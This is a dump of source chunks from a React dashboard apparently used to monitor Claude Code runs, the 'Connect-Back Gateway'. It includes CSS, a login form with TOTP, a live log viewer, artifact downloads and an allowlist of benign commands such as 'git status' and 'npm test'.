solid var(--border-color);\n  border-radius: 6px;\n  color: var(--text-primary);\n  transition: border-color 0.15s ease;", "metadata": {"file": "ui/src/styles.css", "start_line": 401, "end_line": 600, "language": "css"}}, {"corpus": "code", "source": "ui/src/styles.css", "location": "ui/src/styles.css:601", "score": 0.0, "content": "}\n\n.form-input:focus {\n  outline: none;\n  border-color: var(--accent-blue);\n}\n\n.form-input::placeholder {\n  color: var(--text-muted);\n}\n\n/* Artifacts */\n.artifact-list {\n  list-style: none;\n  display: flex;\n  flex-direction: column;\n  gap: 6px;\n}\n\n.artifact-item {\n  display: flex;\n  align-items: center;\n  justify-content: space-between;\n  padding: 12px;\n  background: var(--bg-tertiary);\n  border-radius: 6px;\n  gap: 12px;\n}\n\n.artifact-name {\n  font-family: monospace;\n  font-size: 13px;\n  word-break: break-all;\n}\n\n.artifact-meta {\n  display: block;\n  font-size: 11px;\n  color: var(--text-muted);\n  margin-top: 2px;\n}\n\n/* Commands list */\n.commands-list {\n  display: flex;\n  flex-direction: column;\n  gap: 12px;\n}\n\n.command-item {\n  background: var(--bg-secondary);\n  border: 1px solid var(--border-color);\n  border-radius: 8px;\n  padding: 12px;\n}\n\n.command-header {\n  display: flex;\n  justify-content: space-between;\n  align-items: center;\n  gap: 12px;\n  margin-bottom: 8px;\n}\n\n.command-text {\n  font-family: monospace;\n  font-size: 13px;\n  word-break: break-all;\n}\n\n.command-meta {\n  font-size: 11px;\n  color: var(--text-muted);\n}\n\n.command-result,\n.command-error {\n  margin-top: 8px;\n  padding: 8px;\n  font-family: monospace;\n  font-size: 12px;\n  border-radius: 4px;\n  overflow-x: auto;\n  white-space: pre-wrap;\n  word-break: break-all;\n}\n\n.command-result {\n  background: var(--bg-tertiary);\n  color: var(--text-secondary);\n}\n\n.command-error {\n  background: rgba(248, 81, 73, 0.1);\n  color: var(--accent-red);\n}\n\n/* Alerts */\n.alert-list {\n  display: flex;\n  flex-direction: column;\n  gap: 8px;\n}\n\n.alert-item {\n  display: flex;\n  align-items: stretch;\n  gap: 12px;\n  padding: 12px;\n  background: var(--bg-secondary);\n  border-radius: 8px;\n}\n\n.alert-content {\n  flex: 1;\n  min-width: 0;\n}\n\n.alert-header {\n  display: flex;\n  align-items: center;\n  gap: 8px;\n  margin-bottom: 4px;\n  flex-wrap: wrap;\n}\n\n.alert-severity {\n  font-size: 10px;\n  font-weight: 700;\n  letter-spacing: 0.5px;\n}\n\n.alert-type {\n  font-size: 11px;\n  color: var(--text-muted);\n}\n\n.alert-time {\n  font-size: 11px;\n  color: var(--text-muted);\n  margin-left: auto;\n}\n\n.alert-title {\n  font-size: 14px;\n  font-weight: 500;\n}\n\n.alert-message {\n  font-size: 13px;\n  color: var(--text-secondary);\n  margin-top: 4px;\n}\n\n/* Rules list */\n.rules-list {\n  display: flex;\n  flex-direction: column;\n  gap: 8px;\n}\n\n.rule-item {\n  display: flex;\n  justify-content: space-between;\n  align-items: center;\n  padding: 12px;\n  background: var(--bg-tertiary);\n  border-radius: 6px;\n  gap: 12px;\n}\n\n.rule-info {\n  flex: 1;\n  min-width: 0;\n}\n\n.rule-name {\n  font-size: 14px;\n  font-weight: 500;\n}\n\n.rule-type {\n  font-size: 12px;\n  color: var(--text-muted);\n}\n\n.rule-actions {\n  display: flex;\n  align-items: center;\n  gap: 8px;\n}\n\n/* Switch toggle */\n.switch {\n  position: relative;\n  display: inline-block;\n  width: 40px;\n  height: 24px;\n}\n", "metadata": {"file": "ui/src/styles.css", "start_line": 601, "end_line": 800, "language": "css"}}, {"corpus": "code", "source": "ui/src/styles.css", "location": "ui/src/styles.css:801", "score": 0.0, "content": ".switch input {\n  opacity: 0;\n  width: 0;\n  height: 0;\n}\n\n.slider {\n  position: absolute;\n  cursor: pointer;\n  inset: 0;\n  background-color: var(--bg-tertiary);\n  border: 1px solid var(--border-color);\n  transition: 0.3s;\n  border-radius: 24px;\n}\n\n.slider:before {\n  position: absolute;\n  content: \"\";\n  height: 18px;\n  width: 18px;\n  left: 2px;\n  bottom: 2px;\n  background-color: var(--text-secondary);\n  transition: 0.3s;\n  border-radius: 50%;\n}\n\ninput:checked + .slider {\n  background-color: var(--accent-blue);\n  border-color: var(--accent-blue);\n}\n\ninput:checked + .slider:before {\n  transform: translateX(16px);\n  background-color: white;\n}\n\n/* Settings */\n.settings-section {\n  margin-bottom: 24px;\n}\n\n.settings-card {\n  background: var(--bg-secondary);\n  border: 1px solid var(--border-color);\n  border-radius: 8px;\n  overflow: hidden;\n}\n\n.settings-row {\n  display: flex;\n  justify-content: space-between;\n  align-items: center;\n  padding: 12px 16px;\n  border-bottom: 1px solid var(--border-color);\n  gap: 12px;\n}\n\n.settings-row:last-child {\n  border-bottom: none;\n}\n\n.settings-label {\n  font-size: 14px;\n  color: var(--text-secondary);\n}\n\n.settings-value {\n  font-size: 14px;\n  color: var(--text-primary);\n}\n\n.settings-hint {\n  font-size: 12px;\n  color: var(--text-muted);\n  margin-top: 8px;\n}\n\n.settings-hint code {\n  background: var(--bg-tertiary);\n  padding: 2px 4px;\n  border-radius: 3px;\n}\n\n/* Events list */\n.event-list {\n  display: flex;\n  flex-direction: column;\n  gap: 4px;\n}\n\n.event-item {\n  display: flex;\n  align-items: center;\n  gap: 8px;\n  padding: 8px 12px;\n  background: var(--bg-secondary);\n  border-radius: 4px;\n}\n\n.event-item:hover {\n  background: var(--bg-tertiary);\n}\n\n/* Client sections */\n.client-section {\n  margin-bottom: 24px;\n}\n\n.client-header,\n.run-header {\n  margin-bottom: 16px;\n}\n\n/* Empty states */\n.empty-state {\n  text-align: center;\n  padding: 48px 24px;\n  color: var(--text-secondary);\n}\n\n.empty-state h2 {\n  font-size: 18px;\n  margin-bottom: 8px;\n  color: var(--text-primary);\n}\n\n.empty-state-small {\n  text-align: center;\n  padding: 24px;\n  color: var(--text-muted);\n  font-size: 13px;\n  font-style: italic;\n}\n\n/* Loading */\n.loading {\n  display: flex;\n  align-items: center;\n  justify-content: center;\n  padding: 48px;\n}\n\n.spinner {\n  width: 32px;\n  height: 32px;\n  border: 3px solid var(--border-color);\n  border-top-color: var(--accent-blue);\n  border-radius: 50%;\n  animation: spin 1s linear infinite;\n}\n\n@keyframes spin {\n  to { transform: rotate(360deg); }\n}\n\n/* Animations */\n@keyframes slideIn {\n  from {\n    opacity: 0;\n    transform: translateY(20px);\n  }\n  to {\n    opacity: 1;\n    transform: translateY(0);\n  }\n}\n\n@keyframes slideUp {\n  from {\n    opacity: 0;\n    transform: translateY(10px);\n  }\n  to {\n    opacity: 1;\n    transform: translateY(0);\n  }\n}\n\n@keyframes fadeIn {\n  from {\n    opacity: 0;\n  }\n  to {\n    opacity: 1;\n  }\n}\n\n/* Login page */\n.login-container {\n  display: flex;\n  align-items: center;\n  justify-content: center;\n  min-height: 100vh;\n  padding: 16px;\n}\n\n.login-card {\n  width: 100%;", "metadata": {"file": "ui/src/styles.css", "start_line": 801, "end_line": 1000, "language": "css"}}, {"corpus": "code", "source": "ui/src/styles.css", "location": "ui/src/styles.css:1001", "score": 0.0, "content": "  max-width: 400px;\n}\n\n.login-title {\n  text-align: center;\n  font-size: 24px;\n  margin-bottom: 24px;\n}\n\n/* Connection status */\n.connection-status {\n  display: flex;\n  align-items: center;\n  gap: 6px;\n  font-size: 12px;\n  color: var(--text-secondary);\n}\n\n.connection-status.connected {\n  color: var(--accent-green);\n}\n\n.connection-status.disconnected {\n  color: var(--accent-red);\n}\n\n/* Filter bar mobile toggle */\n@media (max-width: 640px) {\n  .filter-bar-toggle {\n    display: flex !important;\n  }\n\n  .filter-bar-content[data-expanded=\"false\"] {\n    display: none;\n  }\n\n  .filter-bar-content {\n    flex-direction: column;\n    padding-top: 12px;\n  }\n}\n\n/* Mobile responsive adjustments */\n@media (max-width: 640px) {\n  .header {\n    padding: 10px 12px;\n  }\n\n  .header h1 {\n    font-size: 16px;\n  }\n\n  .main {\n    padding: 12px;\n  }\n\n  .page-title {\n    font-size: 18px;\n  }\n\n  .stats-grid {\n    gap: 8px;\n  }\n\n  .stat-card {\n    padding: 12px;\n  }\n\n  .stat-value {\n    font-size: 24px;\n  }\n\n  .btn-group {\n    width: 100%;\n  }\n\n  .btn-group .btn {\n    flex: 1;\n  }\n\n  .tabs {\n    margin-left: -12px;\n    margin-right: -12px;\n    padding-left: 12px;\n    padding-right: 12px;\n  }\n}\n\n/* Keyboard focus states */\n*:focus-visible {\n  outline: 2px solid var(--accent-blue);\n  outline-offset: 2px;\n}\n\nbutton:focus-visible,\na:focus-visible,\ninput:focus-visible,\nselect:focus-visible {\n  outline: 2px solid var(--accent-blue);\n  outline-offset: 2px;\n}\n\n/* Scrollbar styling */\n::-webkit-scrollbar {\n  width: 8px;\n  height: 8px;\n}\n\n::-webkit-scrollbar-track {\n  background: var(--bg-primary);\n}\n\n::-webkit-scrollbar-thumb {\n  background: var(--border-color);\n  border-radius: 4px;\n}\n\n::-webkit-scrollbar-thumb:hover {\n  background: var(--text-muted);\n}\n\n/* Print styles */\n@media print {\n  .bottom-nav,\n  .header,\n  .action-bar {\n    display: none !important;\n  }\n\n  .main {\n    padding: 0;\n    padding-bottom: 0;\n  }\n}", "metadata": {"file": "ui/src/styles.css", "start_line": 1001, "end_line": 1134, "language": "css"}}, {"corpus": "code", "source": "ui/src/components/Layout.tsx", "location": "ui/src/components/Layout.tsx:1", "score": 0.0, "content": "import { ReactNode, useState, useEffect } from 'react';\nimport { NavLink, useLocation } from 'react-router-dom';\n\ninterface LayoutProps {\n  user: { id: string; username: string; role: string } | null;\n  onLogout: () => void;\n  children: ReactNode;\n}\n\ninterface NavItem {\n  path: string;\n  label: string;\n  icon: string;\n  activeIcon: string;\n}\n\nconst navItems: NavItem[] = [\n  { path: '/', label: 'Dashboard', icon: '\\uD83C\\uDFE0', activeIcon: '\\uD83C\\uDFE0' },\n  { path: '/runs', label: 'Runs', icon: '\\uD83D\\uDCCB', activeIcon: '\\uD83D\\uDCCB' },\n  { path: '/clients', label: 'Clients', icon: '\\uD83D\\uDCBB', activeIcon: '\\uD83D\\uDCBB' },\n  { path: '/alerts', label: 'Alerts', icon: '\\uD83D\\uDD14', activeIcon: '\\uD83D\\uDD14' },\n  { path: '/settings', label: 'Settings', icon: '\\u2699\\uFE0F', activeIcon: '\\u2699\\uFE0F' },\n];\n\nexport function Layout({ user, onLogout, children }: LayoutProps) {\n  const location = useLocation();\n  const [alertCount, setAlertCount] = useState(0);\n\n  // Fetch unacknowledged alert count\n  useEffect(() => {\n    const fetchAlertCount = async () => {\n      try {\n        const res = await fetch('/api/alerts/stats');\n        if (res.ok) {\n          const data = await res.json();\n          setAlertCount(data.unacknowledged || 0);\n        }\n      } catch (err) {\n        // Ignore\n      }\n    };\n\n    fetchAlertCount();\n    const interval = setInterval(fetchAlertCount, 30000);\n    return () => clearInterval(interval);\n  }, []);\n\n  // Get page title based on route\n  const getPageTitle = () => {\n    const path = location.pathname;\n    if (path === '/') return 'Dashboard';\n    if (path.startsWith('/runs/')) return 'Run Details';\n    if (path === '/runs') return 'Runs';\n    if (path.startsWith('/clients/')) return 'Client Details';\n    if (path === '/clients') return 'Clients';\n    if (path === '/alerts') return 'Alerts';\n    if (path === '/settings') return 'Settings';\n    return 'Connect-Back Gateway';\n  };\n\n  return (\n    <div className=\"layout\">\n      {/* Top header - Desktop */}\n      <header className=\"header header-desktop\">\n        <div style={{ display: 'flex', alignItems: 'center', gap: '24px' }}>\n          <h1 style={{ fontSize: '18px', fontWeight: 600 }}>\n            <NavLink to=\"/\" style={{ color: 'inherit', textDecoration: 'none' }}>\n              Connect-Back Gateway\n            </NavLink>\n          </h1>\n\n          {/* Desktop nav */}\n          <nav className=\"desktop-nav\">\n            {navItems.map((item) => (\n              <NavLink\n                key={item.path}\n                to={item.path}\n                end={item.path === '/'}\n                className={({ isActive }) =>\n                  `nav-link ${isActive ? 'nav-link-active' : ''}`\n                }\n              >\n                <span className=\"nav-icon\">{item.icon}</span>\n                {item.label}\n                {item.path === '/alerts' && alertCount > 0 && (\n                  <span className=\"nav-badge\">{alertCount}</span>\n                )}\n              </NavLink>\n            ))}\n          </nav>\n        </div>\n\n        <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>\n          {user && (\n            <>\n              <span style={{ fontSize: '14px', color: 'var(--text-secondary)' }}>\n                {user.username}\n                <span\n                  style={{\n                    marginLeft: '6px',\n                    padding: '2px 6px',\n                    fontSize: '10px',\n                    background: 'var(--bg-tertiary)',\n                    borderRadius: '4px',\n                    textTransform: 'uppercase',\n                  }}\n                >\n                  {user.role}\n                </span>\n              </span>\n              <button className=\"btn btn-sm\" onClick={onLogout}>\n                Logout\n              </button>\n            </>\n          )}\n        </div>\n      </header>\n\n      {/* Top header - Mobile */}\n      <header className=\"header header-mobile\">\n        <h1 style={{ fontSize: '16px', fontWeight: 600 }}>\n          {getPageTitle()}\n        </h1>\n        {user && (\n          <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>\n            <span\n              style={{\n                padding: '2px 6px',\n                fontSize: '10px',\n                background: 'var(--bg-tertiary)',\n                borderRadius: '4px',\n                textTransform: 'uppercase',\n              }}\n            >\n              {user.role}\n            </span>\n          </div>\n        )}\n      </header>\n\n      {/* Main content */}\n      <main className=\"main\">\n        {children}\n      </main>\n\n      {/* Bottom navigation - Mobile */}\n      <nav className=\"bottom-nav\">\n        {navItems.map((item) => {\n          const isActive = item.path === '/'\n            ? location.pathname === '/'\n            : location.pathname.startsWith(item.path);\n\n          return (\n            <NavLink\n              key={item.path}\n              to={item.path}\n              className=\"bottom-nav-item\"\n              style={{\n                color: isActive ? 'var(--accent-blue)' : 'var(--text-secondary)',\n              }}\n            >\n              <span style={{ fontSize: '20px', marginBottom: '2px' }}>\n                {isActive ? item.activeIcon : item.icon}\n              </span>\n              <span style={{ fontSize: '10px' }}>{item.label}</span>\n              {item.path === '/alerts' && alertCount > 0 && (\n                <span\n                  style={{\n                    position: 'absolute',\n                    top: '4px',\n                    right: 'calc(50% - 16px)',\n                    width: '16px',\n                    height: '16px',\n                    background: 'var(--accent-red)',\n                    color: 'white',\n                    fontSize: '10px',\n                    borderRadius: '50%',\n                    display: 'flex',\n                    alignItems: 'center',\n                    justifyContent: 'center',\n                  }}\n                >\n                  {alertCount > 9 ? '9+' : alertCount}\n                </span>\n              )}\n            </NavLink>\n          );\n        })}\n      </nav>\n    </div>\n  );\n}\n\nexport default Layout;", "metadata": {"file": "ui/src/components/Layout.tsx", "start_line": 1, "end_line": 194, "language": "tsx"}}, {"corpus": "code", "source": "ui/src/components/Login.tsx", "location": "ui/src/components/Login.tsx:1", "score": 0.0, "content": "import { useState } from 'react';\n\ninterface Props {\n  onLogin: (user: { id: string; username: string; role: string }) => void;\n}\n\nfunction Login({ onLogin }: Props) {\n  const [username, setUsername] = useState('');\n  const [password, setPassword] = useState('');\n  const [totpCode, setTotpCode] = useState('');\n  const [needsTotp, setNeedsTotp] = useState(false);\n  const [error, setError] = useState('');\n  const [loading, setLoading] = useState(false);\n\n  async function handleSubmit(e: React.FormEvent) {\n    e.preventDefault();\n    setError('');\n    setLoading(true);\n\n    try {\n      const res = await fetch('/api/auth/login', {\n        method: 'POST',\n        headers: { 'Content-Type': 'application/json' },\n        body: JSON.stringify({\n          username,\n          password,\n          totpCode: totpCode || undefined\n        })\n      });\n\n      const data = await res.json();\n\n      if (!res.ok) {\n        if (data.totpRequired) {\n          setNeedsTotp(true);\n        } else {\n          setError(data.error || 'Login failed');\n        }\n        return;\n      }\n\n      onLogin(data.user);\n    } catch (err) {\n      setError('Connection error');\n    } finally {\n      setLoading(false);\n    }\n  }\n\n  return (\n    <div className=\"login-container\">\n      <div className=\"card login-card\">\n        <h1 className=\"login-title\">Claude Code Monitor</h1>\n\n        <form onSubmit={handleSubmit}>\n          <div className=\"form-group\">\n            <label className=\"form-label\">Username</label>\n            <input\n              type=\"text\"\n              className=\"form-input\"\n              value={username}\n              onChange={(e) => setUsername(e.target.value)}\n              required\n              autoComplete=\"username\"\n              autoFocus\n            />\n          </div>\n\n          <div className=\"form-group\">\n            <label className=\"form-label\">Password</label>\n            <input\n              type=\"password\"\n              className=\"form-input\"\n              value={password}\n              onChange={(e) => setPassword(e.target.value)}\n              required\n              autoComplete=\"current-password\"\n            />\n          </div>\n\n          {needsTotp && (\n            <div className=\"form-group\">\n              <label className=\"form-label\">TOTP Code</label>\n              <input\n                type=\"text\"\n                className=\"form-input\"\n                value={totpCode}\n                onChange={(e) => setTotpCode(e.target.value)}\n                placeholder=\"6-digit code\"\n                pattern=\"[0-9]{6}\"\n                maxLength={6}\n                autoComplete=\"one-time-code\"\n              />\n            </div>\n          )}\n\n          {error && (\n            <div style={{ color: 'var(--accent-red)', marginBottom: '16px', fontSize: '14px' }}>\n              {error}\n            </div>\n          )}\n\n          <button\n            type=\"submit\"\n            className=\"btn btn-primary\"\n            style={{ width: '100%' }}\n            disabled={loading}\n          >\n            {loading ? 'Logging in...' : 'Login'}\n          </button>\n        </form>\n      </div>\n    </div>\n  );\n}\n\nexport default Login;", "metadata": {"file": "ui/src/components/Login.tsx", "start_line": 1, "end_line": 117, "language": "tsx"}}, {"corpus": "code", "source": "ui/src/components/RunDetail.tsx", "location": "ui/src/components/RunDetail.tsx:1", "score": 0.0, "content": "import { useState, useEffect, useRef } from 'react';\nimport { useParams, Link } from 'react-router-dom';\n\ninterface Run {\n  id: string;\n  status: string;\n  command: string | null;\n  created_at: number;\n  started_at: number | null;\n  finished_at: number | null;\n  exit_code: number | null;\n  error_message: string | null;\n  artifacts: Artifact[];\n}\n\ninterface Event {\n  id: number;\n  type: string;\n  data: string;\n  timestamp: number;\n}\n\ninterface Artifact {\n  id: string;\n  name: string;\n  type: string;\n  size: number;\n}\n\ninterface Props {\n  user: { id: string; username: string; role: string } | null;\n}\n\nconst ALLOWED_COMMANDS = [\n  'npm test',\n  'git diff',\n  'git status',\n  'git log --oneline -10',\n  'ls -la'\n];\n\nfunction RunDetail({ user }: Props) {\n  const { runId } = useParams<{ runId: string }>();\n  const [run, setRun] = useState<Run | null>(null);\n  const [events, setEvents] = useState<Event[]>([]);\n  const [loading, setLoading] = useState(true);\n  const [connected, setConnected] = useState(false);\n  const [assistUrl, setAssistUrl] = useState<string | null>(null);\n  const logRef = useRef<HTMLDivElement>(null);\n  const wsRef = useRef<WebSocket | null>(null);\n  const lastEventId = useRef(0);\n\n  useEffect(() => {\n    fetchRun();\n    fetchEvents();\n    connectWebSocket();\n\n    return () => {\n      if (wsRef.current) {\n        wsRef.current.close();\n      }\n    };\n  }, [runId]);\n\n  useEffect(() => {\n    // Auto-scroll to bottom when new events arrive\n    if (logRef.current) {\n      logRef.current.scrollTop = logRef.current.scrollHeight;\n    }\n  }, [events]);\n\n  async function fetchRun() {\n    try {\n      const res = await fetch(`/api/runs/${runId}`);\n      if (res.ok) {\n        const data = await res.json();\n        setRun(data);\n      }\n    } catch (err) {\n      console.error('Failed to fetch run:', err);\n    } finally {\n      setLoading(false);\n    }\n  }\n\n  async function fetchEvents() {\n    try {\n      const res = await fetch(`/api/runs/${runId}/events?after=${lastEventId.current}`);\n      if (res.ok) {\n        const newEvents = await res.json();\n        if (newEvents.length > 0) {\n          setEvents((prev) => [...prev, ...newEvents]);\n          lastEventId.current = newEvents[newEvents.length - 1].id;\n\n          // Check for assist events\n          for (const event of newEvents) {\n            if (event.type === 'assist') {\n              try {\n                const data = JSON.parse(event.data);\n                setAssistUrl(data.url);\n              } catch {}\n            }\n          }\n        }\n      }\n    } catch (err) {\n      console.error('Failed to fetch events:', err);\n    }\n  }\n\n  function connectWebSocket() {\n    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';\n    const ws = new WebSocket(`${protocol}//${window.location.host}/ws`);\n\n    ws.onopen = () => {\n      setConnected(true);\n      ws.send(JSON.stringify({ type: 'subscribe', runId }));\n    };\n\n    ws.onmessage = (msg) => {\n      try {\n        const data = JSON.parse(msg.data);\n        if (data.type === 'event') {\n          setEvents((prev) => [\n            ...prev,\n            {\n              id: data.eventId,\n              type: data.eventType,\n              data: data.data,\n              timestamp: data.timestamp\n            }\n          ]);\n          lastEventId.current = data.eventId;\n\n          // Check for assist events\n          if (data.eventType === 'assist') {\n            try {\n              const parsed = JSON.parse(data.data);\n              setAssistUrl(parsed.url);\n            } catch {}\n          }\n        } else if (data.type === 'command_completed') {\n          // Refresh run status\n          fetchRun();\n        }\n      } catch {}\n    };\n\n    ws.onclose = () => {\n      setConnected(false);\n      // Reconnect after delay\n      setTimeout(connectWebSocket, 3000);\n    };\n\n    ws.onerror = () => {\n      setConnected(false);\n    };\n\n    wsRef.current = ws;\n  }\n\n  async function sendCommand(command: string) {\n    try {\n      const res = await fetch(`/api/runs/${runId}/command`, {\n        method: 'POST',\n        headers: { 'Content-Type': 'application/json' },\n        body: JSON.stringify({ command })\n      });\n      if (!res.ok) {\n        const error = await res.json();\n        alert(`Failed: ${error.error}`);\n      }\n    } catch (err) {\n      alert('Failed to send command');\n    }\n  }\n\n  async function requestStop() {\n    if (!confirm('Stop this run?')) return;\n    try {\n      await fetch(`/api/runs/${runId}/stop`, { method: 'POST' });\n    } catch (err) {\n      alert('Failed to request stop');\n    }\n  }\n\n  function getEventClass(type: string) {\n    switch (type) {\n      case 'stdout': return 'log-line-stdout';\n      case 'stderr': return 'log-line-stderr';\n      case 'info': return 'log-line-info';\n      case 'marker': return 'log-line-marker';\n      case 'assist': return 'log-line-assist';\n      default: return '';\n    }\n  }\n\n  function formatBytes(bytes: number) {\n    if (bytes < 1024) return `${bytes} B`;\n    if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)} KB`;", "metadata": {"file": "ui/src/components/RunDetail.tsx", "start_line": 1, "end_line": 200, "language": "tsx"}}, {"corpus": "code", "source": "ui/src/components/RunDetail.tsx", "location": "ui/src/components/RunDetail.tsx:201", "score": 0.0, "content": "    return `${(bytes / (1024 * 1024)).toFixed(1)} MB`;\n  }\n\n  if (loading) {\n    return (\n      <div className=\"loading\">\n        <div className=\"spinner\" />\n      </div>\n    );\n  }\n\n  if (!run) {\n    return (\n      <div className=\"empty-state\">\n        <h2>Run not found</h2>\n        <Link to=\"/\" className=\"btn\">Back to runs</Link>\n      </div>\n    );\n  }\n\n  const canOperate = user?.role === 'admin' || user?.role === 'operator';\n  const isActive = run.status === 'running';\n\n  return (\n    <div>\n      <div style={{ marginBottom: '16px' }}>\n        <Link to=\"/\" className=\"btn btn-sm\" style={{ marginRight: '12px' }}>\n          \u2190 Back\n        </Link>\n        <span className={`status status-${run.status}`}>\n          <span className=\"status-dot\" />\n          {run.status}\n        </span>\n        <span className={`connection-status ${connected ? 'connected' : 'disconnected'}`} style={{ marginLeft: '12px' }}>\n          {connected ? '\u25cf Live' : '\u25cb Reconnecting...'}\n        </span>\n      </div>\n\n      {/* Run info */}\n      <div className=\"card\">\n        <div style={{ display: 'grid', gap: '8px', fontSize: '14px' }}>\n          <div>\n            <strong>Run ID:</strong> <code>{run.id}</code>\n          </div>\n          {run.command && (\n            <div>\n              <strong>Command:</strong> <code>{run.command}</code>\n            </div>\n          )}\n          <div>\n            <strong>Created:</strong> {new Date(run.created_at * 1000).toLocaleString()}\n          </div>\n          {run.started_at && (\n            <div>\n              <strong>Started:</strong> {new Date(run.started_at * 1000).toLocaleString()}\n            </div>\n          )}\n          {run.finished_at && (\n            <div>\n              <strong>Finished:</strong> {new Date(run.finished_at * 1000).toLocaleString()}\n            </div>\n          )}\n          {run.exit_code !== null && (\n            <div>\n              <strong>Exit code:</strong> <code>{run.exit_code}</code>\n            </div>\n          )}\n        </div>\n      </div>\n\n      {/* Actions */}\n      {canOperate && (\n        <div className=\"card\">\n          <div className=\"card-header\">\n            <span className=\"card-title\">Actions</span>\n          </div>\n          <div className=\"btn-group\" style={{ flexWrap: 'wrap' }}>\n            {isActive && (\n              <button className=\"btn btn-danger\" onClick={requestStop}>\n                Stop\n              </button>\n            )}\n            {ALLOWED_COMMANDS.map((cmd) => (\n              <button\n                key={cmd}\n                className=\"btn\"\n                onClick={() => sendCommand(cmd)}\n                disabled={!isActive}\n              >\n                {cmd}\n              </button>\n            ))}\n          </div>\n        </div>\n      )}\n\n      {/* Assist session */}\n      {assistUrl && (\n        <div className=\"card\" style={{ borderColor: 'var(--accent-green)' }}>\n          <div className=\"card-header\">\n            <span className=\"card-title\" style={{ color: 'var(--accent-green)' }}>\n              Assist Session Active\n            </span>\n          </div>\n          <div style={{ fontFamily: 'monospace', fontSize: '14px', wordBreak: 'break-all' }}>\n            {assistUrl.startsWith('http') ? (\n              <a href={assistUrl} target=\"_blank\" rel=\"noopener\" style={{ color: 'var(--accent-blue)' }}>\n                {assistUrl}\n              </a>\n            ) : (\n              <code>{assistUrl}</code>\n            )}\n          </div>\n        </div>\n      )}\n\n      {/* Log viewer */}\n      <div className=\"log-container\">\n        <div className=\"log-header\">\n          <span>Log Output</span>\n          <span style={{ fontSize: '12px', color: 'var(--text-secondary)' }}>\n            {events.length} events\n          </span>\n        </div>\n        <div className=\"log-content\" ref={logRef}>\n          {events.length === 0 ? (\n            <div style={{ color: 'var(--text-muted)', fontStyle: 'italic' }}>\n              Waiting for output...\n            </div>\n          ) : (\n            events.map((event) => (\n              <div key={event.id} className={`log-line ${getEventClass(event.type)}`}>\n                {event.type === 'marker' ? (\n                  `\u25b6 ${JSON.parse(event.data).event?.toUpperCase() || event.data}`\n                ) : event.type === 'assist' ? (\n                  `\ud83d\udd17 Assist: ${JSON.parse(event.data).url || event.data}`\n                ) : (\n                  event.data\n                )}\n              </div>\n            ))\n          )}\n        </div>\n      </div>\n\n      {/* Artifacts */}\n      {run.artifacts && run.artifacts.length > 0 && (\n        <div className=\"card\" style={{ marginTop: '16px' }}>\n          <div className=\"card-header\">\n            <span className=\"card-title\">Artifacts</span>\n          </div>\n          <ul className=\"artifact-list\">\n            {run.artifacts.map((artifact) => (\n              <li key={artifact.id} className=\"artifact-item\">\n                <div>\n                  <span className=\"artifact-name\">{artifact.name}</span>\n                  <span className=\"artifact-size\" style={{ marginLeft: '8px' }}>\n                    ({formatBytes(artifact.size)})\n                  </span>\n                </div>\n                <a\n                  href={`/api/artifacts/${artifact.id}`}\n                  className=\"btn btn-sm\"\n                  download\n                >\n                  Download\n                </a>\n              </li>\n            ))}\n          </ul>\n        </div>\n      )}\n    </div>\n  );\n}\n\nexport default RunDetail;", "metadata": {"file": "ui/src/components/RunDetail.tsx", "start_line": 201, "end_line": 377, "language": "tsx"}}, {"corpus": "code", "source": "ui/src/components/RunList.tsx", "location": "ui/src/components/RunList.tsx:1", "score": 0.0, "content": "import { useState, useEffect } from 'react';\nimport { useNavigate } from 'react-router-dom';\n\ninterface Run {\n  id: string;\n  status: string;\n  command: string | null;\n  created_at: number;\n  started_at: number | null;\n  finished_at: number | null;\n  exit_code: number | null;\n}\n\ninterface Props {\n  user: { id: string; username: string; role: string } | null;\n}\n\nfunction RunList({ user }: Props) {\n  const [runs, setRuns] = useState<Run[]>([]);\n  const [loading, setLoading] = useState(true);\n  const navigate = useNavigate();\n\n  useEffect(() => {\n    fetchRuns();\n    const interval = setInterval(fetchRuns, 5000);\n    return () => clearInterval(interval);\n  }, []);\n\n  async function fetchRuns() {\n    try {\n      const res = await fetch('/api/runs');\n      if (res.ok) {\n        const data = await res.json();\n        setRuns(data);\n      }\n    } catch (err) {\n      console.error('Failed to fetch runs:', err);\n    } finally {\n      setLoading(false);\n    }\n  }\n\n  async function createRun() {\n    const command = prompt('Enter Claude command (optional):');\n    try {\n      const res = await fetch('/api/runs', {\n        method: 'POST',\n        headers: { 'Content-Type': 'application/json' },\n        body: JSON.stringify({ command: command || undefined })\n      });\n      if (res.ok) {\n        const data = await res.json();\n        // Show the command to run\n        alert(\n          `Run created!\\n\\n` +\n          `Run ID: ${data.id}\\n` +\n          `Token: ${data.capabilityToken}\\n\\n` +\n          `Start the wrapper with:\\n` +\n          `./wrapper/claude-runner start --run-id ${data.id} --token ${data.capabilityToken}` +\n          (command ? ` --cmd \"${command}\"` : '')\n        );\n        fetchRuns();\n      }\n    } catch (err) {\n      console.error('Failed to create run:', err);\n      alert('Failed to create run');\n    }\n  }\n\n  function formatTime(timestamp: number | null) {\n    if (!timestamp) return '-';\n    return new Date(timestamp * 1000).toLocaleString();\n  }\n\n  function getStatusClass(status: string) {\n    switch (status) {\n      case 'running': return 'status-running';\n      case 'pending': return 'status-pending';\n      case 'done': return 'status-done';\n      case 'failed': return 'status-failed';\n      default: return '';\n    }\n  }\n\n  if (loading) {\n    return (\n      <div className=\"loading\">\n        <div className=\"spinner\" />\n      </div>\n    );\n  }\n\n  const canOperate = user?.role === 'admin' || user?.role === 'operator';\n\n  return (\n    <div>\n      <div className=\"card-header\" style={{ marginBottom: '16px' }}>\n        <h2 className=\"card-title\">Runs</h2>\n        {canOperate && (\n          <button className=\"btn btn-primary\" onClick={createRun}>\n            New Run\n          </button>\n        )}\n      </div>\n\n      {runs.length === 0 ? (\n        <div className=\"empty-state\">\n          <h2>No runs yet</h2>\n          <p>Create a new run to get started.</p>\n        </div>\n      ) : (\n        <ul className=\"run-list\">\n          {runs.map((run) => (\n            <li\n              key={run.id}\n              className=\"run-item\"\n              onClick={() => navigate(`/runs/${run.id}`)}\n            >\n              <div className=\"run-info\">\n                <div className=\"run-id\">{run.id}</div>\n                <div className=\"run-meta\">\n                  <span>{formatTime(run.created_at)}</span>\n                  {run.command && (\n                    <span style={{ fontFamily: 'monospace' }}>\n                      {run.command.slice(0, 50)}\n                      {run.command.length > 50 ? '...' : ''}\n                    </span>\n                  )}\n                </div>\n              </div>\n              <span className={`status ${getStatusClass(run.status)}`}>\n                <span 